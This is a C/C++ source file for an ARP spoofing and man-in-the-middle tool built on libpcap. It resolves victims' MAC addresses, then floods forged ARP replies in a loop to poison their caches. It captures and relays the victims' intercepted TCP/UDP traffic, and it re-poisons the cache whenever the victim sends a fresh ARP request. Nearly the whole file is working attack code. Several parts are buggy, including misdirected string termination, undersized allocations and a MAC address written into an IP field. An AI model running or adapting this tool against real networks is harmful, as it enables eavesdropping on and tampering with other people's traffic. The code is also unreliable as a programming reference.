#include "stdafx.h"
#include "Processing.h"
#include <time.h>

// ########## Define a function to elimate special character ##########
char* delChar(char* buf, char ch){
    int cnt = 0;
    char* result = (char*)malloc(strlen(buf));
    for(int i = 0; buf[i] != 0; i++){
        if(buf[i] != ch){
            result[cnt] = buf[i];
            cnt++;
        }
    }
    buf[cnt] = 0;
    return result;
}

// ########## Define a function to insert zero ##########
char* convert_mac(const char* data){
    char buf[128] = {0x00, };
    char t_buf[8];
    char* stp = strtok((char*)data, ":");
    char* result_str = (char*)malloc(20);
    int temp = 0;
    do{
        memset(t_buf, 0x0, sizeof(t_buf));
        sscanf(stp, "%x", &temp);
        snprintf(t_buf, sizeof(t_buf)-1, "%02x", temp);
        strncat(buf, t_buf, sizeof(buf)-1);
        strncat(buf, ":", sizeof(buf)-1);
        //printf("buf : %s\n", buf);
    }
    while((stp = strtok(NULL, ":")) != NULL);
    buf[strlen(buf)] = '\0';
    strncpy(result_str, buf, strlen(buf));
    return result_str;
}

// ########## Sending contaminated ARP packets ##########
void* Attack(void* info){
    srand(time(NULL));
    const int n = 6;
    int random = ((rand() % n) + 1);

    struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
    struct in_addr src_in_addr, target_in_addr;
    struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
    attack_packet->frame_type = htons(ARP_FRAME_TYPE);
    attack_packet->mac_type = htons(ETHER_MAC_TYPE);
    attack_packet->prot_type = htons(IP_PROTO_TYPE);
    attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
    attack_packet->prot_addr_size = IP_ADDR_LEN;
    attack_packet->op = htons(OP_ARP_REPLY);

    tomar_ip_addr(&src_in_addr, PP->sip);
    tomar_ip_addr(&target_in_addr, PP->tip);

    tomar_mac_addr(attack_packet->Destination_mac_addr, PP->tmac);
    tomar_mac_addr(attack_packet->target_mac_addr, PP->tmac);
    tomar_mac_addr(attack_packet->src_mac_addr, PP->smac);
    tomar_mac_addr(attack_packet->sender_mac_addr, PP->smac);

    memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
    memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

    bzero(attack_packet->padding, 18);

    while(1){ // 2 attacks per 1~6 random seconds (asynchronous attack)
        for(int i = 0; i < 2; i++){
            printf("\n----------_ARP (Session %d)_----------\n", PP->session_Number);
            printf("[ sip : %s  ]\n", PP->sip);
            printf("[ smac : %s ]\n", PP->smac);
            printf("[ tip : %s  ]\n", PP->tip);
            printf("[ tmac : %s ]\n\n", PP->tmac);
            if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
                perror("{ send packet error }");
                exit(1);
            }
        }
        sleep(random);
    }
}

struct Info_mymac* find_My_Mac(){
    struct Info_mymac* IM = (struct Info_mymac*)malloc(50);
    int sockfd, req_cnt = REQ_CNT;
    char* s_mac_addr = (char*)malloc(sizeof(char)*20);
    if(s_mac_addr == NULL){ perror("{ s_mac_addr malloc error }"); exit(1); }
    char* s_ip_addr = (char*)malloc(sizeof(char)*20);
    if(s_ip_addr == NULL){ perror("{ s_ip_addr malloc error }"); exit(1); }

    struct sockaddr_in* sock;
    struct ifconf ifcnf_s;
    struct ifreq* ifr_s;

    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        perror("{ socket error }");
        return NULL;
    }

    memset((void*)&ifcnf_s, 0x0, sizeof(ifcnf_s));
    ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
    ifcnf_s.ifc_buf = (char*)malloc(ifcnf_s.ifc_len);
    if(ioctl(sockfd, SIOCGIFCONF, (char*)&ifcnf_s) < 0){
        perror("{ icoctl - SIOCGIFCONF error }");
        return NULL;
    }

    if(ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt)){
        req_cnt = ifcnf_s.ifc_len;
        ifcnf_s.ifc_buf = (char*)realloc(ifcnf_s.ifc_buf, req_cnt);
    }

    ifr_s = ifcnf_s.ifc_req;
    for(int cnt = 0; cnt < ifcnf_s.ifc_len; cnt += sizeof(struct ifreq), ifr_s++){
        if(ioctl(sockfd, SIOCGIFFLAGS, ifr_s) < 0){
            perror("{ ioctl - SIOCGFFLAGS error }");
            return NULL;
        }

        if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
        sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
        sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
        if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
            perror("{ ioctl - SIOCGFHWADDR error }");
            return NULL;
        }
        strncpy(s_mac_addr, convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data))), 20);
    }
    char* smac = (char*)malloc(sizeof(char)*20);
    strncpy(smac, delChar(s_mac_addr, ':'), sizeof(char)*20);
    strncpy(IM->my_mac, smac, strlen(smac));
    strncpy(IM->my_ip, s_ip_addr, strlen(s_ip_addr));
    return IM;
}

void* find_Mac(void* info){
    // @@@@@@@@@@@@@@@ Make Packet @@@@@@@@@@@@@@@
    struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
    struct ARP_header* ah = (struct ARP_header*)malloc(sizeof(struct ARP_header));
    struct in_addr src_in_addr, target_in_addr;
    char* sender_mac = (char*)malloc(sizeof(char)*20);
    if(sender_mac == NULL){ perror("{ sender_mac malloc error }"); exit(1); }

    printf("\n[ < Session %d > / Starting to find < %s > mac address ]\n", PP->session_Number, PP->tip);

    char broadcast_mac1[12] = {0};
    strncpy(broadcast_mac1, "ffffffffffff", 12);

    char broadcast_mac2[12] = {0};
    strncpy(broadcast_mac2, "000000000000", 12);

    ah->frame_type = htons(ARP_FRAME_TYPE);
    ah->mac_type = htons(ETHER_MAC_TYPE);
    ah->prot_type = htons(IP_PROTO_TYPE);
    ah->mac_addr_size = ETH_MAC_ADDR_LEN;
    ah->prot_addr_size = IP_ADDR_LEN;
    ah->op = htons(OP_ARP_REQUEST);

    PP->tip[strlen(PP->tip)] = '\0';
    PP->sip[strlen(PP->sip)] = '\0';
    tomar_ip_addr(&src_in_addr, PP->sip);
    tomar_ip_addr(&target_in_addr, PP->tip);

    tomar_mac_addr(ah->Destination_mac_addr, broadcast_mac1);
    tomar_mac_addr(ah->target_mac_addr, broadcast_mac2);
    tomar_mac_addr(ah->src_mac_addr, PP->smac);
    tomar_mac_addr(ah->sender_mac_addr, PP->smac);

    memcpy(ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
    memcpy(ah->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

    printf("[ Sender mac addr : %02x%02x%02x%02x%02x%02x ]\n", ah->src_mac_addr[0], ah->src_mac_addr[1], ah->src_mac_addr[2], ah->src_mac_addr[3], ah->src_mac_addr[4], ah->src_mac_addr[5]);
    printf("[ Sender ip addr : %d.%d.%d.%d ]\n", ah->sender_ip_addr[0], ah->sender_ip_addr[1], ah->sender_ip_addr[2], ah->sender_ip_addr[3]);
    printf("[ Target ip addr : %d.%d.%d.%d ]\n", ah->target_ip_addr[0], ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);
    bzero(ah->padding, 18);

    struct ARP_header* temp;
    // @@@@@@@@@@@@@@@ Send Request & Recieve Reply @@@@@@@@@@@@@@@
    int count = 0;
    while(1){
        printf("\n[ < Session %d > / send packet to < %s > / count : %d ]\n", PP->session_Number, PP->tip, count);
        for(int i = 0; i < 2; i++){
            if(pcap_sendpacket(PP->handle, reinterpret_cast<u_char*>(ah), 42) != 0){
                perror("{ send packet error }");
                exit(1);
            }
        }
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(PP->handle, &header, &packet);
        if (res == -1 || res == -2) break;
        temp = (struct ARP_header*)(packet);

        printf("[ Frame_type : %04x ]\n", htons(temp->frame_type));
        char* c = (char*)malloc(sizeof(4));
        if(c == NULL){ perror("c malloc error"); exit(1); }
        sprintf(c, "%02x", temp->op);
        printf("[ Operation : %s ]\n", c);
        if(strcmp(c, "100") == 0)
            printf("< Request >\n");
        else if(strcmp(c, "200") == 0) printf("( Reply )\n");
        else printf("{ Unknown }\n");

        char a[16] = {0};
        sprintf(a, "%d.%d.%d.%d", temp->sender_ip_addr[0],
temp->sender_ip_addr[1], temp->sender_ip_addr[2], temp->sender_ip_addr[3]);

        char b[16] = {0};
        sprintf(b, "%d.%d.%d.%d", ah->target_ip_addr[0],
ah->target_ip_addr[1], ah->target_ip_addr[2], ah->target_ip_addr[3]);

        printf("[ Packet's sender ip addr : %s ]\n", a);
        printf("[ < Session %d > target ip addr : %s ]\n", PP->session_Number, b);

        if((temp->frame_type == htons(ARP_FRAME_TYPE)) && (temp->op == htons(OP_ARP_REPLY)) && (memcmp(temp->sender_ip_addr, ah->target_ip_addr, sizeof(temp->sender_ip_addr)) == 0)){
            printf("[ < Session %d > Success to access %d ]\n", PP->session_Number, count);
            break;
        }
        count++;
        sleep(0.2);
        free(c);
    }

    sprintf(sender_mac, "%02x%02x%02x%02x%02x%02x", temp->sender_mac_addr[0],
temp->sender_mac_addr[1], temp->sender_mac_addr[2], temp->sender_mac_addr[3], temp->sender_mac_addr[4], temp->sender_mac_addr[5]);
    return (void*)(sender_mac);
}

void Manage_Session(struct Parameter_Pthread* pt3){
    struct pcap_pkthdr* header;
    const u_char* packet;

    int res = pcap_next_ex(pt3->handle, &header, &packet);
    if (res == -1 || res == -2) return ;
    printf("\n@ ######################## @\n");
    printf("[ -- Session < %d > %u Bytes captured -- ]\n", pt3->session_Number, header->caplen);

    printf("[ -------_Ethernet_------- ]\n");
    uint8_t tmp = 0; // Ethernet header size
    int isCorrect = 0;
    Ethernet_header eh;
    tmp = eh.Print_Eth(packet);
    isCorrect = eh.Check_Eth(packet, pt3->smac, pt3->tmac, pt3->attack_mac);

    printf("[ isCorrect : %d ]\n", isCorrect);
    // Check spoofed packets
    if(isCorrect == 2){
        for(int x = 0; x < SESSION_NUM; x++){
            if(pt3->session_Number == x){
                printf("[ --_Session Number_-- : %d ]\n", x);
                break;
            }
        }
        if(tmp == 1){
            packet += 14;
            char* tmp2; // IP protocol type
            IP_header ih;
            tmp2 = ih.Print_IP(packet);
            if(!strcmp(tmp2, "6"))
                printf("[ ---------_TCP_--------- ]\n");
            else if(!strcmp(tmp2, "11"))
                printf("[ ---------_UDP_--------- ]\n");
            else
                printf("[ ------_Unknown Protocol_------ ]\n");
            packet += 20;
            TCP_header th;
            UDP_header uh;
            if(!strcmp(tmp2, "6")){
                th.Print_TCP(packet);
            }
            else if(!strcmp(tmp2, "11")){
                uh.Print_UDP(packet);
            }
            else{
                printf("{ No Network Data here for this protocol! }\n");
            }

            // Relay
            // change sender mac address to my mac address
            packet -= 34;
            struct ARP_header* Ah = (struct ARP_header*)(packet);
            struct in_addr src_in_addr;
            // attacker's ip -> sender's ip
            tomar_ip_addr(&src_in_addr, pt3->sip);
            memcpy(Ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);

            // sender's mac -> attacker's mac
            tomar_mac_addr(Ah->src_mac_addr, pt3->attack_mac);
            tomar_mac_addr(Ah->sender_mac_addr, pt3->attack_mac);

            // attacker's mac -> target's mac
            tomar_mac_addr(Ah->Destination_mac_addr, pt3->tmac);
            tomar_mac_addr(Ah->target_ip_addr, pt3->tmac);

            char aa[13];
            sprintf(aa, "%02x%02x%02x%02x%02x%02x", Ah->sender_mac_addr[0], Ah->sender_mac_addr[1], Ah->sender_mac_addr[2], Ah->sender_mac_addr[3], Ah->sender_mac_addr[4], Ah->sender_mac_addr[5]);

            char bb[13];
            sprintf(bb, "%02x%02x%02x%02x%02x%02x", Ah->target_ip_addr[0], Ah->target_ip_addr[1], Ah->target_ip_addr[2], Ah->target_ip_addr[3], Ah->target_ip_addr[4], Ah->target_ip_addr[5]);

            printf("[ Attacker's mac : %s ]\n", pt3->attack_mac);
            printf("[ Changed sender mac address : %s ]\n", aa);
            printf("[ Target mac address : %s ]\n", pt3->tip);
            printf("[ Changed target mac address: %s ]\n", bb);
            if(pcap_sendpacket(pt3->handle,  reinterpret_cast<u_char*>(Ah), 42) != 0){
                perror("{ send packet error }");
                exit(1);
            }
            Ethernet_header eh1;
            eh1.Print_Eth(packet);
            printf("[ Success to send Relay packet! ]\n");
        }
    }
    // Check broadcast packets sended by sender
    else if(isCorrect == 11){
        struct ARP_header* Ah2 = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
        struct in_addr src_in_addr, target_in_addr;

        Ah2->frame_type = htons(ARP_FRAME_TYPE);
        Ah2->mac_type = htons(ETHER_MAC_TYPE);
        Ah2->prot_type = htons(IP_PROTO_TYPE);
        Ah2->mac_addr_size = ETH_MAC_ADDR_LEN;
        Ah2->prot_addr_size = IP_ADDR_LEN;
        Ah2->op = htons(OP_ARP_REPLY);

        // target -> sender
        tomar_ip_addr(&src_in_addr, pt3->tip);
        tomar_ip_addr(&target_in_addr, pt3->sip);
        memcpy(Ah2->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
        memcpy(Ah2->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

        tomar_mac_addr(Ah2->Destination_mac_addr, pt3->smac);
        tomar_mac_addr(Ah2->target_mac_addr, pt3->smac);
        tomar_mac_addr(Ah2->src_mac_addr, pt3->attack_mac);
        tomar_mac_addr(Ah2->sender_mac_addr, pt3->attack_mac);
        bzero(Ah2->padding, 18);

        // attack 2 times
        for(int i = 0 ; i < 2; i++){
            if(pcap_sendpacket(pt3->handle,  reinterpret_cast<u_char*>(Ah2), 42) != 0){
                perror("{ send packet error }");
                exit(1);
            }
            printf("[ Success to send contaminated packet! ( Broadcast ) ( %d ) ]\n", i);
        }
    }
    // Check unicast packets sended by sender to target
    else if(isCorrect == 101){
        struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
        struct in_addr src_in_addr, target_in_addr;
        attack_packet->frame_type = htons(ARP_FRAME_TYPE);
        attack_packet->mac_type = htons(ETHER_MAC_TYPE);
        attack_packet->prot_type = htons(IP_PROTO_TYPE);
        attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
        attack_packet->prot_addr_size = IP_ADDR_LEN;
        attack_packet->op = htons(OP_ARP_REPLY);

        tomar_ip_addr(&src_in_addr, pt3->tip);
        tomar_ip_addr(&target_in_addr, pt3->sip);

        tomar_mac_addr(attack_packet->Destination_mac_addr, pt3->smac);
        tomar_mac_addr(attack_packet->target_mac_addr, pt3->smac);
        tomar_mac_addr(attack_packet->src_mac_addr, pt3->attack_mac);
        tomar_mac_addr(attack_packet->sender_mac_addr, pt3->attack_mac);

        memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
        memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

        bzero(attack_packet->padding, 18);

        for(int i = 0 ; i < 2; i++){
            if(pcap_sendpacket(pt3->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
                perror("{ send packet error }");
                exit(1);
            }
            printf("[ Success to send contaminated packet! ( Unicast ) ( %d ) ]\n", i);
        }
    }
    else{
        printf("{ This packet has no relation with this program. }\n");
    }
}

void Print_Data(const u_char* Packet_DATA){
    printf("[ ");
    for(int i = 0; i < 10; i++) printf("%02x ", Packet_DATA[i]);
    printf(" ]\n");
}

void usage(char* device) {
    printf("{ syntax: ARP_TEST <interface> (sender ip) (target ip) (target ip) (sender ip) (other sessions...) }\n");
    printf("{ sample: ARP_TEST %s 192.168.168.101 192.168.168.1 192.168.168.1 192.168.168.101 ... }\n", device);
}

